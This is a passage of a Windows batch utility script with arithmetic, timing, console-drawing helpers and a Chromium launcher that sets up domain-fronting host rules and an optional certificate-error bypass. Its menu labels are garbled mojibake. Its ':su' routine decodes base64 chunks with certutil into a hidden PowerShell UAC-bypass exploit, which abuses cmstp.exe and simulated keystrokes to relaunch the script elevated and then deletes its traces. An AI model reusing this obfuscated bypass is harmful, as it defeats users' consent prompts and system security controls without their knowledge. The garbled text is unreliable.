		endlocal&set "%3=%time_diff%"
	)
)
goto :eof
:strlen
setlocal
set "$=!%1!#"
set N=&for %%a in (4096 2048 1024 512 256 128 64 32 16)do if !$:~%%a!. NEQ . set/aN+=%%a&set $=!$:~%%a!
set $=!$!fedcba9876543210&set/aN+=0x!$:~16,1!
endlocal&If %2. neq . (set/a%2=%N%)else echo;%N%
goto :eof
:ys
setlocal
for /f "tokens=1,2,3,4 delims=:." %%a in ("!time!") do (
	set /a "start=1%%a*360000+1%%b*6000+1%%c*100+1%%d"
)
:ys_loop
for /f "tokens=1,2,3,4 delims=:." %%a in ("!time!") do (
	set /a "sub=(1%%a*360000+1%%b*6000+1%%c*100+1%%d)-start"
)
if !sub! lss 0 (
	goto :eof
) else (
	if !sub! geq %1 (goto :eof) else (goto ys_loop)
)
goto :eof
:list
(
set start=1
set "a1=���U�����lpk.dll����"
set "a2=���U�����jwgkvsq.vmx�����������߸ò���"
set "a3=����ϵͳ����"
set "a4=��ʾϵͳ��Ϣ"
set "a5=������������������"
set "a6=��ʾ�������ļ�(���˸��ಡ����)"
set "a7=���ע�������"
set "a8=���㿪ƽ��"
set "a9=�л���������ʾ��"
set "a10=�����̸�ʽת��ΪNTFS"
set "a11=���̴����޸�"
set "a12=��ʽ��"
set "a13=DOS������"
set "a14=���������ʾ��������"
set "a15=�����������"
set "a16=���KHATRA����"
set "a17=��ע���"
set "a18=�򿪿������"
set "a19=��DirectX��Ϲ���"
set "a20=�򿪼��������"
set "a21=�û�����"
set "a22=�������"
set "a23=DOS���������"
set "a24=�ļ�ϵͳ��Ϣ��ѯ"
set "a25=����ָ����С���ļ�"
set "a26=����U�̲���"
set "a27=������Ƭ����"
set "a28=һ��ɾ�����ļ���"
set "a29=ping���������ӳ�"
set "a30=Ӳ�����"
set "a31=������"
set "a32=DOS����"
set "a33=��ʱ��"
set "a34=�������������"
set "a35=ɾ��ÿ���̷��µ�System Volume Information�ļ���"
set "a36=������ת����"
set "a37=�ı����"
set "a38=��ʾ��������û�������"
set "a39=NTFSѹ��"
set "a40=��ȡ�ļ�Ȩ��"
set "a41=��ʾ����������"
set "a42=�����Ķ���"
set "a43=�������ļ����շ���"
set "a44=�ļ�����"
set "a45=�޸����𻵵��ļ�"
set "a46=�����ƽ�ѹ��������"
set "a47=Wifi�ȵ�"
set "a48=������chm�ļ�"
set "a49=�ر�����Ӧ����"
set "a50=�ļ��Ƚ���"
set "a51=������д����а�"
set "a52=��ϵͳ��������"
set "a53=��֪�����ռ�������"
set "a54=��ѯϵͳ����״̬"
set "a55=����ָ���ļ��Ŀ�ݷ�ʽ������"
set "a56=��ϵͳ����"
set "a57=����ͳ��"
set "a58=������������"
set "a59=�򿪹������̨"
set "a60=���Streams�ļ�����"
set "a61=������ɾ�����г���װ���"
set "a62=ע�������"
set "a63=Base64�����"
set "a64=8.3���ļ�������"
set "a65=����NTFSѹ��"
set "a66=�����ļ���ϣֵ"
set "a67=��ʾ���һ���"
set "a68=���������̷�"
set "a69=��ѹmsi��װ�ļ�"
set "a70=����CMD����̨ɫ�ʱ�"
set "a71=KMS����Windows"
set "a72=curl���������"
set "a73=����ǰ�ò�������Chromium�������"
set "a74=��һ�����ļ���ѹ��"
set "a75=��֤�����Ԫ"
set "a76=BAT�ı�����"
set "a77=VBS������"
set maxa=77
)
goto :eof
:colortxt
setlocal
if "!winv!" equ "0" (goto colortxt2)
set "bj=%1"
if "!bj:~1,1!" equ "" (
	set "bj1=!color!"
	set "bj2=!bj!"
) else (
	set "bj1=!bj:~0,1!"
	set "bj2=!bj:~1,1!"
)
pushd "%temp%"
set /p =!cswz1!<nul>"%2"
findstr /v /a:!bj1!!bj2! /r "^$" "%2" nul
del /f "%2">nul 2>nul
popd
goto :eof
:colortxt2
set "bj=%1"
set "zt=%2"
if "!bj:~0,1!" equ "0" set bj1=40;
if "!bj:~0,1!" equ "4" set bj1=41;
if "!bj:~0,1!" equ "2" set bj1=42;
if "!bj:~0,1!" equ "6" set bj1=43;
if "!bj:~0,1!" equ "1" set bj1=44;
if "!bj:~0,1!" equ "5" set bj1=45;
if "!bj:~0,1!" equ "3" set bj1=46;
if "!bj:~0,1!" equ "7" set bj1=47;
if "!bj:~0,1!" equ "8" set bj2=90m
if "!bj:~0,1!" equ "c" set bj2=91m
if "!bj:~0,1!" equ "a" set bj2=92m
if "!bj:~0,1!" equ "e" set bj2=93m
if "!bj:~0,1!" equ "9" set bj2=94m
if "!bj:~0,1!" equ "d" set bj2=95m
if "!bj:~0,1!" equ "b" set bj2=96m
if "!bj:~0,1!" equ "f" set bj2=97m
if "!bj:~1,1!" equ "8" set bj2=90m
if "!bj:~1,1!" equ "c" set bj2=91m
if "!bj:~1,1!" equ "a" set bj2=92m
if "!bj:~1,1!" equ "e" set bj2=93m
if "!bj:~1,1!" equ "9" set bj2=94m
if "!bj:~1,1!" equ "d" set bj2=95m
if "!bj:~1,1!" equ "b" set bj2=96m
if "!bj:~1,1!" equ "f" set bj2=97m
if "!bj:~1,1!" equ "" set "bj1=!ysbak:~0,3!"
set /p =!cswz!!bj1!!bj2!!zt!!cswz!!ysbak!<nul
goto :eof
:rgb
setlocal
set "brgb=%1"
set "qrgb=%2"
set "zt=%3"
set "brgb=!brgb:.=;!"
set "qrgb=!qrgb:.=;!"
set /p =!cswz!48;2;!brgb!;38;2;!qrgb!m!zt!!cswz!!ysbak!<nul
goto :eof
:su
(
echo;IyBVQUMgQnlwYXNzIHBvYyB1c2luZyBTZW5kS2V5cw0KIyBWZXJzaW9uIDEuMA0K
echo;IyBBdXRob3I6IE9kZHZhciBNb2UNCiMgRnVuY3Rpb25zIGJvcnJvd2VkIGZyb206
echo;IGh0dHBzOi8vcG93ZXJzaGVsbC5vcmcvZm9ydW1zL3RvcGljL3NlbmRrZXlzLw0K
echo;IyBUb2RvOiBIaWRlIHdpbmRvdyBvbiBzY3JlZW4gZm9yIHN0ZWFsdGgNCiMgVG9k
echo;bzogTWFrZSBzY3JpcHQgZWRpdCB0aGUgSU5GIGZpbGUgZm9yIGNvbW1hbmQgdG8g
echo;aW5qZWN0Li4uDQoNCg0KRnVuY3Rpb24gc2NyaXB0OlNldC1JTkZGaWxlIHsNCltD
echo;bWRsZXRCaW5kaW5nKCldDQoJUGFyYW0gKA0KCVtQYXJhbWV0ZXIoSGVscE1lc3Nh
echo;Z2U9IlNwZWNpZnkgdGhlIElORiBmaWxlIGxvY2F0aW9uIildDQoJJEluZkZpbGVM
echo;b2NhdGlvbiA9ICIkZW52OnRlbXBcQ01TVFAuaW5mIiwNCgkNCglbUGFyYW1ldGVy
echo;KEhlbHBNZXNzYWdlPSJTcGVjaWZ5IHRoZSBjb21tYW5kIHRvIGxhdW5jaCBpbiBh
echo;IFVBQy1wcml2aWxlZ2VkIHdpbmRvdyIpXQ0KCVtTdHJpbmddJENvbW1hbmRUb0V4
echo;ZWN1dGUgPSAn
)>%temp%\1.base
(
echo;Jw0KCSkNCg0KJEluZkNvbnRlbnQgPSBAIg0KW3ZlcnNpb25dDQpTaWduYXR1cmU9
echo;YCRjaGljYWdvYCQNCkFkdmFuY2VkSU5GPTIuNQ0KDQpbRGVmYXVsdEluc3RhbGxd
echo;DQpDdXN0b21EZXN0aW5hdGlvbj1DdXN0SW5zdERlc3RTZWN0aW9uQWxsVXNlcnMN
echo;ClJ1blByZVNldHVwQ29tbWFuZHM9UnVuUHJlU2V0dXBDb21tYW5kc1NlY3Rpb24N
echo;Cg0KW1J1blByZVNldHVwQ29tbWFuZHNTZWN0aW9uXQ0KOyBDb21tYW5kcyBIZXJl
echo;IHdpbGwgYmUgcnVuIEJlZm9yZSBTZXR1cCBCZWdpbnMgdG8gaW5zdGFsbA0KJENv
echo;bW1hbmRUb0V4ZWN1dGUNCnRhc2traWxsIC9JTSBjbXN0cC5leGUgL0YNCg0KW0N1
echo;c3RJbnN0RGVzdFNlY3Rpb25BbGxVc2Vyc10NCjQ5MDAwLDQ5MDAxPUFsbFVTZXJf
echo;TERJRFNlY3Rpb24sIDcNCg0KW0FsbFVTZXJfTERJRFNlY3Rpb25dDQoiSEtMTSIs
echo;ICJTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxBcHAg
echo;UGF0aHNcQ01NR1IzMi5FWEUiLCAiUHJvZmlsZUluc3RhbGxQYXRoIiwgIiVVbmV4
echo;cGVjdGVkRXJyb3IlIiwgIiINCg0KW1N0cmluZ3NdDQpTZXJ2aWNlTmFtZT0iQ29y
echo;cFZQTiINClNob3J0U3ZjTmFtZT0iQ29ycFZQTiINCg0KIkANCg0KJEluZkNvbnRl
echo;bnQgfCBPdXQtRmlsZSAkSW5mRmlsZUxvY2F0aW9uIC1FbmNvZGluZyBBU0NJSQ0K
echo;fQ0KDQoNCkZ1bmN0aW9uIEdldC1Id25kDQp7DQogIFtDbWRsZXRCaW5kaW5nKCld
echo;DQogICAgDQogIFBhcmFtDQogICgNCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9
echo;ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUp
echo;XSBbc3RyaW5nXSAkUHJvY2Vzc05hbWUNCiAgKQ0KICBQcm9jZXNzDQogICAgew0K
echo;ICAgICAgICAkRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ1N0b3AnDQogICAgICAg
echo;IFRyeSANCiAgICAgICAgew0KICAgICAgICAgICAgJGh3bmQgPSBHZXQtUHJvY2Vz
echo;cyAtTmFtZSAkUHJvY2Vzc05hbWUgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9w
echo;ZXJ0eSBNYWluV2luZG93SGFuZGxlDQogICAgICAgIH0NCiAgICAgICAgQ2F0Y2gg
echo;DQogICAgICAgIHsNCiAgICAgICAgICAgICRod25kID0gJG51bGwNCiAgICAgICAg
echo;fQ0KICAgICAgICAkaGFzaCA9IEB7DQogICAgICAgIFByb2Nlc3NOYW1lID0gJFBy
echo;b2Nlc3NOYW1lDQogICAgICAgIEh3bmQgICAgICAgID0gJGh3bmQNCiAgICAgICAg
echo;fQ0KICAgICAgICANCiAgICBOZXctT2JqZWN0IC1UeXBlTmFtZSBQc09iamVjdCAt
echo;UHJvcGVydHkgJGhhc2gNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIFNldC1XaW5kb3dB
echo;Y3RpdmUNCnsNCiAgW0NtZGxldEJpbmRpbmcoKV0NCg0KICBQYXJhbQ0KICAoDQog
echo;ICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxp
echo;bmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0gW3N0cmluZ10gJE5hbWUNCiAgKQ0K
echo;ICANCiAgUHJvY2Vzcw0KICB7DQogICAgJG1lbWJlckRlZmluaXRpb24gPSBAJw0K
echo;ICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiKV0gcHVibGljIHN0YXRpYyBleHRl
echo;cm4gYm9vbCBTaG93V2luZG93KEludFB0ciBoV25kLCBpbnQgbkNtZFNob3cpOw0K
echo;ICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVl
echo;KV0gcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBTZXRGb3JlZ3JvdW5kV2luZG93
echo;KEludFB0ciBoV25kKTsNCg0KJ0ANCg0KICAgIEFkZC1UeXBlIC1NZW1iZXJEZWZp
echo;bml0aW9uICRtZW1iZXJEZWZpbml0aW9uIC1OYW1lIEFwaSAtTmFtZXNwYWNlIFVz
echo;ZXIzMg0KICAgICRod25kID0gR2V0LUh3bmQgLVByb2Nlc3NOYW1lICROYW1lIHwg
echo;U2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgSHduZA0KICAgIElmICgkaHdu
echo;ZCkgDQogICAgew0KICAgICAgJG9uVG9wID0gTmV3LU9iamVjdCAtVHlwZU5hbWUg
echo;U3lzdGVtLkludFB0ciAtQXJndW1lbnRMaXN0ICgwKQ0KICAgICAgW1VzZXIzMi5B
echo;cGldOjpTZXRGb3JlZ3JvdW5kV2luZG93KCRod25kKQ0KICAgICAgW1VzZXIzMi5B
echo;cGldOjpTaG93V2luZG93KCRod25kLCA1KQ0KICAgIH0NCiAgICBFbHNlIA0KICAg
echo;IHsNCiAgICAgIFtzdHJpbmddICRod25kID0gJ04vQScNCiAgICB9DQoNCiAgICAk
echo;aGFzaCA9IEB7DQogICAgICBQcm9jZXNzID0gJE5hbWUNCiAgICAgIEh3bmQgICAg
echo;PSAkaHduZA0KICAgIH0NCiAgICAgICAgDQogICAgTmV3LU9iamVjdCAtVHlwZU5h
echo;bWUgUHNPYmplY3QgLVByb3BlcnR5ICRoYXNoDQogIH0NCn0NCg0KLiBTZXQtSU5G
echo;RmlsZQ0KI05lZWRzIFdpbmRvd3MgZm9ybXMNCmFkZC10eXBlIC1Bc3NlbWJseU5h
echo;bWUgU3lzdGVtLldpbmRvd3MuRm9ybXMNCklmIChUZXN0LVBhdGggJEluZkZpbGVM
echo;b2NhdGlvbikgew0KI0NvbW1hbmQgdG8gcnVuDQokcHMgPSBuZXctb2JqZWN0IHN5
echo;c3RlbS5kaWFnbm9zdGljcy5wcm9jZXNzc3RhcnRpbmZvICJjOlx3aW5kb3dzXHN5
echo;c3RlbTMyXGNtc3RwLmV4ZSINCiRwcy5Bcmd1bWVudHMgPSAiL2F1ICRJbmZGaWxl
echo;TG9jYXRpb24iDQokcHMuVXNlU2hlbGxFeGVjdXRlID0gJGZhbHNlDQoNCiNTdGFy
echo;dCBpdA0KW3N5c3RlbS5kaWFnbm9zdGljcy5wcm9jZXNzXTo6U3RhcnQoJHBzKQ0K
echo;DQpkbw0Kew0KCSMgRG8gbm90aGluZyB1bnRpbCBjbXN0cCBpcyBhbiBhY3RpdmUg
echo;d2luZG93DQp9DQp1bnRpbCAoKFNldC1XaW5kb3dBY3RpdmUgY21zdHApLkh3bmQg
echo;LW5lIDApDQoNCg0KI0FjdGl2YXRlIHdpbmRvdw0KU2V0LVdpbmRvd0FjdGl2ZSBj
echo;bXN0cA0KDQojU2VuZCB0aGUgRW50ZXIga2V5DQpbU3lzdGVtLldpbmRvd3MuRm9y
echo;bXMuU2VuZEtleXNdOjpTZW5kV2FpdCgie0VOVEVSfSIpDQp9
)>%temp%\2.base
set /p =%comspec% /c %0 -ks<nul>%temp%\su.bat
set /p =%temp%\su.bat<nul>%temp%\su.txt
certutil -decode -f "%temp%\1.base" %temp%\1.txt>nul
certutil -decode -f "%temp%\2.base" %temp%\2.txt>nul
copy /b "%temp%\1.txt"+"%temp%\su.txt"+"%temp%\2.txt" "%temp%\bypassps1">nul
powershell -mta -nologo -noprofile -command "$command=[IO.File]::ReadAllText('"%temp%\bypassps1"'); iex ($command[1])"
if exist "!systemroot!\system32\timeout.exe" (
	timeout /t 2 /nobreak>nul
) else (
	ping /n 2 0.0>nul
)
del %temp%\su.txt;%temp%\1.base;%temp%\2.base;%temp%\1.txt;%temp%\2.txt;%temp%\bypass.ps1;%temp%\su.bat
exit 0
:xdwjs
setlocal
set Bytes=%~1
set danwei=%~2
if /i "!danwei!" equ "kb" (set /a bytes*=1024)
if /i "!danwei!" equ "mb" (set /a bytes*=1048576)
if /i "!danwei!" equ "gb" (set /a bytes*=1073741824)
if "%~3" equ "" Goto :eof
call :Division !Bytes! 1152921504606846976 2 OK
if not "%OK:~0,2%" equ "0." (
	endlocal&set %~3=%OK% EB
	Goto :eof
) else (call :Division !Bytes! 1125899906842624 2 OK)
if not "%OK:~0,2%" equ "0." (
	endlocal&set %~3=%OK% PB
	Goto :eof
) else (call :Division !Bytes! 1099511627776 2 OK)
if not "%OK:~0,2%" equ "0." (
	endlocal&set %~3=%OK% TB
	Goto :eof
) else (call :Division !Bytes! 1073741824 2 OK)
if not "%OK:~0,2%" equ "0." (
	endlocal&set %~3=%OK% GB
	Goto :eof
) else (call :Division !Bytes! 1048576 2 OK)
if not "%OK:~0,2%" equ "0." (
	endlocal&set %~3=%OK% MB
	Goto :eof
) else (call :Division !Bytes! 1024 2 OK)
if not "%OK:~0,2%" equ "0." (
	endlocal&set %~3=%OK% KB
	Goto :eof
) else (
	endlocal&set %~3=%Bytes% Byte
	Goto :eof
)
:Division
setlocal
if "%~4" equ "" Goto :eof
set Div.1=%~1
set Div.2=%~2
set Div.3=
set Div.I=0
set Div.D=%~3
set Div.1.Len.0=
set Div.2.Len.0=
set Div.Z=00000000
for /l %%i in (1 1 9) do set Div.Num.%%i=
for /l %%i in (1 1 7) do set Div.Z=!Div.Z!!Div.Z!
set Div.H=4096 2048 1024 512 256 128 64 32 16 8 4 2 1
for /l %%i in (1 1 2) do (
	set Div.N=0
	set Div.%%i.Len.2=0
	for %%j in (!Div.%%i:.^= !) do (
		set /a Div.N+=1
		set Div.M=Div.M%%j
		set Div.%%i.Len.!Div.N!=0
		for %%l in (!Div.H!) do (
			if "!Div.M:~%%l!" neq "" (
				set /a Div.%%i.Len.!Div.N!+=%%l
				set Div.M=!Div.M:~%%l!
			)
		)
		set /a Div.%%i.Len.0+=Div.%%i.Len.!Div.N!
	)
        set Div.%%i=!Div.%%i:.=!
)
if !Div.1.Len.2! gtr !Div.2.Len.2! (
	set /a Div.2.Len.0+=Div.1.Len.2-Div.2.Len.2
	) else (
		set /a Div.1.Len.0+=Div.2.Len.2-Div.1.Len.2
)
for /l %%i in (1 1 2) do (
	set Div.%%i=!Div.%%i!!Div.Z!
	for %%j in (!Div.%%i.Len.0!) do set Div.%%i=!Div.%%i:~,%%j!
)
for /f "tokens=* delims=0" %%i in ("!Div.2!") do (
	set Div.O=%%i
	set Div.2=0%%i
)
set Div.2.Len.0=1
for %%i in (!Div.H!) do (
	if "!Div.O:~%%i!" neq "" (
		set /a Div.2.Len.0+=%%i
		set Div.O=!Div.O:~%%i!
	)
)
set /a Div.Len=Div.2.Len.0+1
if !Div.1.Len.0! lss !Div.2.Len.0! (
	set Div.1.Len.0=!Div.2.Len.0!
	set Div.1=!Div.Z:~-%Div.2.Len.0%,-%Div.1.Len.0%!!Div.1!
)
set /a Div.1.Len.0+=Div.D
set Div.1=0!Div.1!!Div.Z:~,%Div.D%!
set Div.P=!Div.1:~,%Div.2.Len.0%!
set Div.T=0000000!Div.2!
set /a Div.J+=1
set /a Div.Tem.Len=Div.2.Len.0+7
if !Div.J! equ 1 (for %%i in (!1:~-1!) do (
	for /f "delims=" %%j in ("!%%i!") do (
		if %%~Zj equ !%Div.I%! set C=!Div.D!
		)
	)
)
for /l %%i in (1 1 9) do (
	set Div.V=0
	for /l %%j in (8 8 !Div.Tem.Len!) do (
		set /a Div.V=1!Div.T:~-%%j,8!*%%i+Div.V
        	set Div.Num.%%i=!Div.V:~-8!!Div.Num.%%i!
		set /a Div.V=!Div.V:~,-8!-%%i
	)
	set Div.Num.%%i=!Div.V!!Div.Num.%%i!
	set Div.Num.%%i=0000000!Div.Num.%%i:~-%Div.Len%!
)
for /l %%l in (!Div.2.Len.0! 1 !Div.1.Len.0!) do (
	set Div.P=!Div.Z!!Div.P!!Div.1:~%%l,1!
	set Div.P=!Div.P:~-%Div.Len%!
	if !Div.J! equ 1 (
		set Div.I.Tem=
		for %%i in (!%Div.I%!) do set Div.D.Tem=%%i
		for /l %%i in (0 1 9) do set Div.D.Tem=!Div.D.Tem:%%i=%%i !
		for %%i in (!Div.D.Tem!) do set /a Div.I.Tem=!Div.I.Tem!+%%i
		if !Div.I.Tem! neq 24 set C=
	)
	if "!Div.P!" geq "!Div.2!" (
		set Div.R=1
		set Div.S=0000000!Div.P!
		for /l %%i in (2 1 9) do (
			if "!Div.S!" geq "!Div.Num.%%i!" set Div.R=%%i
		)
		set Div.3=!Div.3!!Div.R!
		set Div.P=
		set Div.V=0
		for %%i in (!Div.R!) do (
			for /l %%j in (8 8 !Div.Tem.Len!) do (
				set /a Div.V=3!Div.S:~-%%j,8!-1!Div.Num.%%i:~-%%j,8!-!Div.V:~,1!%%2
				set Div.P=!Div.V:~1!!Div.P!
			)
		)	
	) else set Div.3=!Div.3!0
)
if defined Div.D if %Div.D% gtr 0 set Div.3=!Div.3:~,-%Div.D%!.!Div.3:~-%Div.D%!
for /f "tokens=* delims=0" %%i in ("!Div.3!") do set Div.3=%%i
if "!Div.3:~0,1!" equ "." set Div.3=0!Div.3!
if "!Div.3!" equ "" set Div.3=0
endlocal&set %~4=%Div.3%
goto :eof
:cf
setlocal
call :cf_1 %1 %2 %3 jg
endlocal&set %4=%jg%
goto :eof
:cf_1
set num=0
set dec_str=
set input=
if "%~4" equ "" (goto :eof)
set /a int_str=%1/%2
set /a mod=%1%%%2
if %mod% equ 0 goto end
:count_dec
set mod=%mod%0
if %mod% lss %2 (
    set dec_str=!dec_str!0
    goto count_dec
) else (
    set /a dec=%mod%/%2
    set dec_str=!dec_str!!dec!
    set /a mod=%mod%%%%2
)
set /a num+=1
if %mod% neq 0 if %num% lss %3 goto count_dec
:end
for /l %%i in (1,1,%3) do set zero_str=!zero_str!0
set dec_str=%dec_str%%zero_str%
set %~4=%int_str%.!dec_str:~0,%3!
goto :eof
:add
setlocal
(set L=&for /l %%a in (1,1,8) do set L=!L!00000000
for /f "tokens=1-3 delims=." %%a in ("!L!%1.!L!") do set at=%%a&set aw=%%b%%c
for /f "tokens=1-3 delims=." %%a in ("!L!%2.!L!") do set bt=%%a&set bw=%%b%%c
set a=!at:~-64!!aw:~,64!&set b=!bt:~-64!!bw:~,64!&set e=&set v=200000000
for /l %%a in (8,8,128)do set/a v=1!b:~-%%a,8!+1!a:~-%%a,8!+!v:~-9,-8!-2&set e=!v:~-8!!e!
set e=!e:0= !&for /f "tokens=*" %%a in ("!e:~,-64!_.!e:~64!") do set e=%%~nxa
set e=!e:_=!&for %%a in ("!e: =0!") do endlocal&(if %3.==. (echo;%%~a) else set %3=%%~a)
goto :eof)
:offdisplay
powershell (Add-Type '[DllImport(\"user32.dll\")]^public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)
goto :eof
:choice
setlocal
choice /c !cho! /n /m "����ѡ��: "
endlocal&set "shuru=%errorlevel%"
goto :eof
:set
setlocal
set shurux=
set /p "shurux=����ѡ��: "
endlocal&set "shuru=%shurux%"
goto :eof
:bk
setlocal
set cs=0
for /f "delims=: skip=2 tokens=2" %%a in ('"mode con"') do (
	set /a "cs+=1"
	if "!cs!" equ "1" (set "h=%%a")
	if "!cs!" equ "2" (set "l=%%a")
)
set /a "h_1=h-1"
set /a "l_1=l-1"
set /a "l_4=l-4"
for /l %%a in (0,1,!l_4!) do (
	set "fh=!fh!-"
)
set "fh=+!fh!+"
set /p =!cswz!1;1H!fh!<nul
for /l %%a in (2,1,!h_1!) do (
	set /p =!cswz!%%a;1H^|!cswz!%%a;!l_1!H^|<nul
)
set /p =!cswz!!h_1!;1H!fh!<nul
goto :eof
:fk
setlocal
set "h=%1"
set "l=%2"
set /a "h1=h+1"
set /a "l1=%4-2"
set /a "h2=h+%3-2"
set /a "l2=l+%4-1"
set /a "h3=h+%3-1"
for /l %%a in (1,1,!l1!) do (
	set "fh=!fh!-"
)
set "fh=+!fh!+"
set /p =!cswz!!h!;!l!H!fh!<nul
for /l %%a in (!h1!,1,!h2!) do (
	set /p =!cswz!%%a;!l!H^|!cswz!%%a;!l2!H^|<nul
)
set /p =!cswz!!h3!;!l!H!fh!<nul
goto :eof
:hx
setlocal
set "h=%1"
set "l=%2"
set /a "cd=%3-2"
for /l %%a in (1,1,!cd!) do (
	set "fh=!fh!-"
)
set "fh=+!fh!+"
set /p =!cswz!!h!;!l!H!fh!<nul
goto :eof
:sx
setlocal
set "h=%1"
set "l=%2"
set /a "h1=h+1"
set /a "h2=h+%3-1"
set /a "cd=%3+h-2"
set /p =!cswz!!h!;!l!H+<nul
for /l %%a in (!h1!,1,!cd!) do (
	set /p =!cswz!%%a;!l!H^|<nul
)
set /p =!cswz!!h2!;!l!H+<nul
goto :eof
:73
setlocal
:chrome
@echo off&setlocal enabledelayedexpansion&chcp 936>nul
set "�����ض���=!temp!\�����ض���.txt"
set "�����ؽ���=!temp!\�����ؽ���.txt"
set "ǿ��ʹ��quic=!temp!\ǿ��ʹ��quic.txt"
if not exist "!�����ض���!" (
	(
		echo #wikipedia
		echo *.wikipedia.org=wikidata.org
		echo *.wikiquote.org=wikidata.org
		echo *.wikinews.org=wikidata.org
		echo *.wikibooks.org=wikidata.org
		echo *.wiktionary.org=wikidata.org
		echo *.wikisource.org=wikidata.org
		echo *.wikivoyage.org=wikidata.org
		echo *.wikiversity.org=wikidata.org
		echo;
		echo #pixiv
		echo pixiv.net=pixiv.me
		echo *.pixiv.net=pixiv.me
		echo *.pximg.net=pximg.net
		echo;
		echo #protonmail
		echo proton.me=pr.tn
		echo account.proton.me=a.pr.tn
		echo account-api.proton.me=b.pr.tn
		echo mail.proton.me=c.pr.tn
		echo;
		echo #youtube
		echo *.youtube.com=google-analytics.com
		echo *.ytimg.com=googleadservices.com
		echo *.ggpht.com=static.doubleclick.net
		echo youtube.com=static.doubleclick.net
		echo youtu.be=mt7.gstatic.com
		echo;
		echo #google
		echo *.google.com=googleadservices.com
		echo *.google.com.hk=googleadservices.com
		echo *.google.com.tw=googleadservices.com
		echo *.googleapis.com=static.doubleclick.net
		echo *.googleusercontent.com=static.doubleclick.net
		echo *.gstatic.com=alt6.gstatic.com
		echo *.cloudfunctions.net=alt6.gstatic.com
		echo *.blogspot.com=google-analytics.com
		echo;
		echo #github
		echo github.com=octocaptcha.com
		echo *.github.com=octocaptcha.com
		echo raw.githubusercontent.com=avatars.githubusercontent.com
		echo *.github.io=octocaptcha.com
		echo github.io=octocaptcha.com
		echo;
		echo #steam
		echo login.steampowered.com=login.steampowered.com
		echo help.steampowered.com=help.steampowered.com
		echo *.steampowered.com=steamuserimages-a.akamaihd.net
		echo steamcommunity.com=underlords.com
		echo *.steamcommunity.com=underlords.com
		echo;
		echo #onedrive
		echo onedrive.live.com=od0.live.com
		echo skyapi.onedrive.live.com=storage.live.com
		echo;
		echo #nyaa
		echo nyaa.si=nyaa.ddos-guard.net
		echo;
		echo #vercel.app
		echo vercel.app=no-sni.vercel-infra.com
		echo *.vercel.app=no-sni.vercel-infra.com
		echo;
		echo #lain.la
		echo *.lain.la=lain.la
		echo;
		echo pkuanvil.com=gcore.com
		echo *.pkuanvil.com=gcore.com
		echo;
		echo #quora
		echo quora.com=qr.ae
		echo *.quora.com=qr.ae
	)>"!�����ض���!"
)
if not exist "!�����ؽ���!" (
	(
		echo #wikipedia
		echo #wikidata.org=[2620:0:863:ed1a::1]
		echo wikidata.org=208.80.153.224
		echo;
		echo #protonmail
		echo pr.tn=proton.me
		echo a.pr.tn=account.proton.me
		echo b.pr.tn=account-api.proton.me
		echo c.pr.tn=mail.proton.me
		echo;
		echo #youtube google
		echo #mt7.gstatic.com=[2404:6800:4008:c07::5a]
		echo mt7.gstatic.com=39.106.25.252
		echo #alt6.gstatic.com=[2404:6800:4008:c07::5a]
		echo alt6.gstatic.com=39.106.25.252
		echo #google-analytics.com=[2404:6800:4008:c07::5a]
		echo google-analytics.com=39.106.25.252
		echo #googleadservices.com=[2404:6800:4008:c07::5a]
		echo googleadservices.com=39.106.25.252
		echo #static.doubleclick.net=[2404:6800:4008:c07::5a]
		echo static.doubleclick.net=39.106.25.252
		echo;
		echo #nyaa
		echo nyaa.ddos-guard.net=nyaa.si
	)>"!�����ؽ���!"
)
if not exist "!ǿ��ʹ��quic!" (
	(
		echo #��֧��ͨ���
		echo www.google.com.hk
		echo www.google.com.tw
		echo www.google.com
		echo www.quora.com
		echo quora.com
		echo qsbr.cf2.quoracdn.net
		echo v2ex.com
		echo cdn.v2ex.com
		echo www.v2ex.com
		echo challenges.cloudflare.com
		echo www.openstreetmap.org
		echo tile.openstreetmap.org
		echo ipfs.io
		echo cloudflare-ipfs.com
	)>"!ǿ��ʹ��quic!"
)
cd /d "%~dp0"
rem ����֤����� 0=���� 1=����
set "pass_cert_error=0"
rem ����chrome-command-line�ļ� 0=���� 1=����
set "chrome-command-line=0"
rem ����֧��chrome�����е��������·��
set "chromium="C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe""
if "!pass_cert_error!" equ "1" (
	set "ignore-certificate-errors=--ignore-certificate-errors"
)
if exist "chrome.exe" (
	set chrome=chrome.exe
	goto startchrome
) else (
	for /f "skip=1 tokens=3 delims= " %%a in ('"reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe" /v Path 2>nul"') do (
		set "chrome=%%a"
	)
	for /f "delims=" %%a in ("!chrome!") do (
		set "chrome=%%~fa"
	)
	if exist "!chrome!\Chrome.exe" (
		set "chrome=!chrome!\Chrome.exe"
		goto startchrome
	) else (
		for /f "delims=" %%a in ("!chromium!") do (
			set "chrome=%%~fa"
		)
		if exist "!chrome!" (
			goto startchrome
		) else (
			if "%1" neq "-chrome" (
				echo;û���ҵ������·��
				call :out 2
				endlocal
				goto memuv2
			) else (
				msg %username% û���ҵ������·��
				exit 0
			)
		)
	)
)
:startchrome
for /f "delims=" %%a in ("!chrome!") do (
	tasklist /fi "IMAGENAME eq %%~nxa"|findstr /i /c:"%%~nxa">nul
	if "!errorlevel!" equ "0" (
		cls
		echo;%%~nxa��������,��ر������������.
		set /p =��������˳�<nul&pause>nul
		if "%1" neq "-chrome" (
			endlocal
			goto memuv2
		) else (
			exit 0
		)
	)
)
if exist "!�����ض���!" (
